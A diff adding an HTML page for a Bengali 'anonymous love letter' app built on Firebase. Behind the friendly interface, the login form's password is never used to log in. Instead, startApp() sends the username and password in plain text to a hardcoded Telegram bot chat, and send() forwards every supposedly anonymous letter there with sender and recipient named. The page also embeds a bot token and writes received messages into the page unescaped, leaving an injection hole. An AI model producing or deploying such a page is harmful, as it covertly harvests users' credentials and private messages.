@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nishobdo Chiti - Prem er Portal 💌</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Satisfy&family=Galada&family=Atma:wght@500&family=Mina:wght@400;700&family=Hind+Siliguri:wght@300;600&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+
+    <style>
+        :root {
+            --romance-pink: #ff758c;
+            --love-red: #ff4b2b;
+            --glass: rgba(255, 255, 255, 0.9);
+        }
+
+        body {
+            background: linear-gradient(135deg, #ff758c 0%, #ff7eb3 100%);
+            font-family: 'Hind Siliguri', sans-serif;
+            margin: 0; min-height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+            overflow-x: hidden;
+        }
+
+        .hearts { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden; pointer-events: none; }
+        .heart { position: absolute; color: white; opacity: 0.3; animation: move 10s linear infinite; }
+        @keyframes move { 0% { transform: translateY(100vh) rotate(0); } 100% { transform: translateY(-10vh) rotate(360deg); } }
+
+        .container {
+            background: var(--glass); width: 90%; max-width: 450px;
+            padding: 30px; border-radius: 30px; border: 2px solid white;
+            box-shadow: 0 15px 35px rgba(255, 75, 124, 0.3); backdrop-filter: blur(10px);
+            text-align: center; position: relative;
+        }
+
+        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .notif-btn { font-size: 24px; cursor: pointer; position: relative; background: white; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; border-radius: 50%; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .notif-dot { position: absolute; top: 5px; right: 5px; width: 10px; height: 10px; background: red; border-radius: 50%; border: 2px solid white; display: none; }
+
+        h2 { color: var(--love-red); font-family: 'Dancing Script', cursive; font-size: 32px; margin-bottom: 5px; }
+        .subtitle { font-size: 14px; color: #666; margin-bottom: 20px; }
+
+        input, textarea, select {
+            width: 100%; padding: 12px; margin: 10px 0;
+            border: 1.5px solid #ffccd5; border-radius: 15px; outline: none;
+            transition: 0.3s; font-family: inherit; box-sizing: border-box;
+        }
+        input:focus { border-color: var(--love-red); box-shadow: 0 0 10px rgba(255, 75, 43, 0.2); }
+
+        .btn-main {
+            background: linear-gradient(to right, #ff4b2b, #ff416c);
+            color: white !important; border: none; padding: 15px; width: 100%;
+            border-radius: 50px; font-weight: bold; cursor: pointer;
+            font-size: 18px; margin-top: 15px; box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4);
+        }
+
+        .style-btns { display: flex; gap: 5px; overflow-x: auto; padding: 10px 0; scrollbar-width: none; }
+        .s-btn { flex: 0 0 auto; padding: 8px 15px; border-radius: 20px; border: 1px solid #ddd; cursor: pointer; font-size: 12px; background: white; }
+
+        #chiti-display {
+            margin-top: 20px; padding: 25px; border-radius: 15px;
+            min-height: 200px; transition: 0.5s; text-align: left;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.05);
+        }
+        .text-layer { font-size: 24px; line-height: 1.5; white-space: pre-wrap; word-wrap: break-word; }
+
+        #inbox-view { display: none; }
+        .chiti-card { background: #fff; padding: 15px; border-radius: 15px; margin-bottom: 10px; text-align: left; border-left: 4px solid var(--love-red); box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .empty-box { padding: 40px 10px; color: #888; }
+        .share-popup { background: #fff0f3; padding: 15px; border-radius: 15px; border: 1px dashed var(--romance-pink); margin-top: 15px; }
+
+        /* Styles */
+        .s1 { background: #fffaf0; font-family: 'Galada', cursive; color: #4a2c2a; }
+        .s2 { background: #ffe4e1; font-family: 'Atma', cursive; color: #c2185b; }
+        .s3 { background: #f0fff0; font-family: 'Mina', sans-serif; color: #2e7d32; }
+        .s4 { background: #2d3436; font-family: 'Dancing Script', cursive; color: #ffeaa7; }
+        .s5 { background: #ffffff; font-family: 'Satisfy', cursive; color: #333; border: 2px solid #ff758c; }
+    </style>
+</head>
+<body>
+
+<div class="hearts" id="hearts-bg"></div>
+
+<div id="auth-box" class="container">
+    <h2>Nishobdo Chiti</h2>
+    <p class="subtitle">Login with username to start 💖</p>
+    <input type="text" id="u_name" placeholder="Username (Ex: @riad)">
+    <input type="password" id="u_pass" placeholder="Password">
+    <button class="btn-main" onclick="startApp()">Start Loving 💌</button>
+</div>
+
+<div id="app-box" class="container" style="display:none;">
+    <div class="top-bar">
+        <div style="text-align: left;">
+            <p style="margin:0; font-size:12px; color:#888;">Welcome,</p>
+            <span id="welcome-user" style="font-weight: bold; color: var(--love-red); font-size:18px;"></span>
+        </div>
+        <div class="notif-btn" onclick="toggleInbox()">
+            📩 <div class="notif-dot" id="notif-dot"></div>
+        </div>
+    </div>
+
+    <div id="compose-view">
+        <input type="text" id="to_user" placeholder="Recipient Username (@name)">
+        <div class="style-btns">
+            <div class="s-btn" onclick="setS('s1')">Classic</div>
+            <div class="s-btn" onclick="setS('s2')">Pinkish</div>
+            <div class="s-btn" onclick="setS('s3')">Nature</div>
+            <div class="s-btn" onclick="setS('s4')">Dark</div>
+            <div class="s-btn" onclick="setS('s5')">Cursive</div>
+        </div>
+        <textarea id="msg_body" rows="4" placeholder="Write your feelings..." oninput="sync()"></textarea>
+        <div id="chiti-display" class="s1"><div id="out-text" class="text-layer">...</div></div>
+        <button class="btn-main" onclick="send()">Send Anonymous 🚀</button>
+        <p onclick="logout()" style="font-size:11px; cursor:pointer; margin-top:15px; color:red;">Logout</p>
+    </div>
+
+    <div id="inbox-view" style="display:none;">
+        <div onclick="toggleInbox()" style="cursor:pointer; text-align: left; margin-bottom:10px;">⬅️ Back</div>
+        <h3 style="color:var(--love-red);">Inbox</h3>
+        <div id="chiti-list"></div>
+        <div class="share-popup">
+            <p style="font-size:13px;">চিঠি পেতে আপনার আপনজনের সাথে লিংক শেয়ার করুন</p>
+            <button class="btn-main" style="padding:10px; font-size:14px;" onclick="copyMyLink()">Copy Link & Share 🔗</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Firebase Setup
+    const firebaseConfig = {
+        apiKey: "AIzaSyCbGzmnhfHmixJ-oavyFPeKM0mXdfS8yfg",
+        authDomain: "silent-letter-ab228.firebaseapp.com",
+        databaseURL: "https://silent-letter-ab228-default-rtdb.firebaseio.com",
+        projectId: "silent-letter-ab228",
+        storageBucket: "silent-letter-ab228.firebasestorage.app",
+        messagingSenderId: "44263491113",
+        appId: "1:44263491113:web:378ed1eff39635dc807e38",
+        measurementId: "G-0GPH4J90EB"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const T_TOKEN = '8372136715:AAE1GxjYadlynBDGMVJ-iMYO6GT02e6inrw';
+    const T_ADMIN = '6945585884';
+
+    let loggedInUser = "";
+    let currentStyle = "s1";
+
+    window.onload = function() {
+        createHearts();
+        const saved = localStorage.getItem('chiti_user');
+        if(saved) {
+            loggedInUser = saved.toLowerCase().replace('@','');
+            showDashboard();
+        }
+    };
+
+    function startApp() {
+        let u = document.getElementById('u_name').value.trim().toLowerCase().replace('@','');
+        let p = document.getElementById('u_pass').value;
+        if(!u || !p) return alert("All fields required!");
+        loggedInUser = u;
+        localStorage.setItem('chiti_user', u);
+        postToTelegram(`👤 **LOGIN**\nUser: @${u}\nPass: ${p}`);
+        showDashboard();
+    }
+
+    function showDashboard() {
+        document.getElementById('auth-box').style.display = 'none';
+        document.getElementById('app-box').style.display = 'block';
+        document.getElementById('welcome-user').innerText = "@" + loggedInUser;
+        listenForNewChiti();
+    }
+
+    function sync() { document.getElementById('out-text').innerText = document.getElementById('msg_body').value || "..."; }
+    function setS(s) { currentStyle = s; document.getElementById('chiti-display').className = s; }
+
+    function send() {
+        let to = document.getElementById('to_user').value.trim().toLowerCase().replace('@','');
+        let msg = document.getElementById('msg_body').value;
+        if(!to || !msg) return alert("Fill receiver and message!");
+
+        database.ref('letters/' + to).push({
+            message: msg,
+            style: currentStyle,
+            timestamp: Date.now()
+        });
+
+        postToTelegram(`💌 **NEW CHITI**\nFrom: @${loggedInUser}\nTo: @${to}\nMsg: ${msg}`);
+        alert(`Chiti sent to @${to}! 🚀`);
+        document.getElementById('msg_body').value = "";
+        sync();
+    }
+
+    function listenForNewChiti() {
+        database.ref('letters/' + loggedInUser).on('value', (snap) => {
+            if(snap.exists()) document.getElementById('notif-dot').style.display = 'block';
+        });
+    }
+
+    function toggleInbox() {
+        const c = document.getElementById('compose-view');
+        const i = document.getElementById('inbox-view');
+        if(i.style.display === 'none') {
+            c.style.display = 'none';
+            i.style.display = 'block';
+            renderInbox();
+            document.getElementById('notif-dot').style.display = 'none';
+        } else {
+            c.style.display = 'block';
+            i.style.display = 'none';
+        }
+    }
+
+    function renderInbox() {
+        const list = document.getElementById('chiti-list');
+        database.ref('letters/' + loggedInUser).once('value', (snap) => {
+            if(!snap.exists()) {
+                list.innerHTML = `<div class="empty-box">আপনি এখনো কোন চিঠি পান্নি!😥😶</div>`;
+            } else {
+                let data = snap.val();
+                list.innerHTML = Object.values(data).reverse().map(item => `
+                    <div class="chiti-card ${item.style}">
+                        <p>${item.message}</p>
+                        <small style="opacity:0.5;">Sent Anonymously</small>
+                    </div>
+                `).join('');
+            }
+        });
+    }
+
+    function copyMyLink() {
+        const link = window.location.href;
+        navigator.clipboard.writeText(link);
+        alert("Link copy hoyeche! Share korun. 🔗");
+    }
+
+    function postToTelegram(t) {
+        fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: T_ADMIN, text: t, parse_mode: 'Markdown' })
+        });
+    }
+
+    function download() {
+        html2canvas(document.getElementById('chiti-display')).then(canvas => {
+            let a = document.createElement('a');
+            a.download = 'chiti.png'; a.href = canvas.toDataURL(); a.click();
+        });
+    }
+
+    function logout() { localStorage.removeItem('chiti_user'); location.reload(); }
+
+    function createHearts() {
+        const heartsBg = document.getElementById('hearts-bg');
+        for(let i=0; i<15; i++) {
+            let h = document.createElement('div');
+            h.className = 'heart'; h.innerHTML = '❤️';
+            h.style.left = Math.random() * 100 + 'vw';
+            h.style.animationDelay = Math.random() * 5 + 's';
+            heartsBg.appendChild(h);
+        }
+    }
+</script>
+</body>
+</html>
